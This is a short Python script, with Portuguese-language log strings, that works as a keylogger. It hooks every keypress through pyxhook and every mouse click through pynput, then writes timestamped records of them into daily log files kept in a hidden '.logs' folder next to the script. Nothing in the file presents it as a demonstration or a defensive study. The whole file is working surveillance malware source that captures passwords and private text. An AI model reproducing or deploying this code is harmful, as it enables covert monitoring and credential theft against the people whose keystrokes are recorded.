from __future__ import print_function

import pyxhook
import time
import os
from datetime import datetime
from pynput import mouse
import logging

DATE_FILE = datetime.now().strftime('%d%m%Y')
DATE_LOG = datetime.now().strftime('%d/%m/%Y %H:%M')
BASE_DIR = os.path.abspath(os.path.dirname(__file__))

if os.path.exists(f'{BASE_DIR}/.logs/') == False:
    os.mkdir(f'{BASE_DIR}/.logs/')

logging.basicConfig(filename=f"{BASE_DIR}/.logs/{DATE_FILE}.log", level=logging.DEBUG, format="%(asctime)s: %(message)s")

characters_keys = ["Alt_L", "BackSpace", "Caps_Lock", "Control_L", "Control_R", "Delete", "Down", "End", "equal", "Escape", "F1", "F10", "F11", "F12", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "Home", "Insert", "Left", "less", "Menu", "minus", "Next", "Num_Lock", "numbersign", "P_Add", "P_Begin", "P_Decimal", "P_Delete", "P_Divide", "P_Down", "P_End", "P_Home", "P_Insert", "P_Left", "P_Multiply", "P_Next", "P_Page_Up", "P_Right", "P_Subtract", "P_Up", "Page_Up", "Pause", "Print", "Right", "Scroll_Lock", "Shift_L", "Shift_R", "space", "Super_L", "underscore", "Up" ] 
characters_no_simb = {"comma" : ",", "semicolon" : ";", "colon" : ":", "exclam" : "!", "question" : "?", "period" : ".", "apostrophe"  : "'", "quotedbl" : "“", "parenleft" : "(", "parenright" : ")", "bracketleft" : "[", "bracketright" : "]", "braceleft" : "{",  "braceright" : "}", "at" : "@", "asterisk" : "*", "slash" : "/", "backslash" : "\\", "ampersand" : "&", "percent" : "%", "plus" : "+", "greater" : ">", "bar" : "|", "dollar" : "$", "ccedilla" : "ç" }
characters_no_keys = {"[65111]": '¨' , "[65107]" : '~' , "[65105]" : '´' , "[65027]" : "[Alt_Gr]"}



def keyboard(event):
    
    global running

    if event.Key in characters_keys:
        logging.info(f'[{event.Key}]')
    
    elif event.Key in characters_no_simb:
        logging.info(characters_no_simb[event.Key])

    elif event.Key in characters_no_keys:
        logging.info(characters_no_keys[event.Key])

    elif event.Key == "Tab" or event.Key == 'P_Enter' or event.Key == "Return":
        logging.info(f'Separador {event.Key} Pressionado')
            
    else:
        logging.info(event.Key)

def on_click(x, y, button, pressed):
    if pressed:
        logging.info(f'Mouse Pressionado em {x, y, button}')

#Mouse
Listen = mouse.Listener()

#Keyboard
hookman = pyxhook.HookManager()
hookman.KeyDown = keyboard
hookman.HookKeyboard()
hookman.start()


with mouse.Listener(on_click=on_click) as listener:
    listener.join()

running = True
while running:
    time.sleep(0.1)

hookman.cancel()
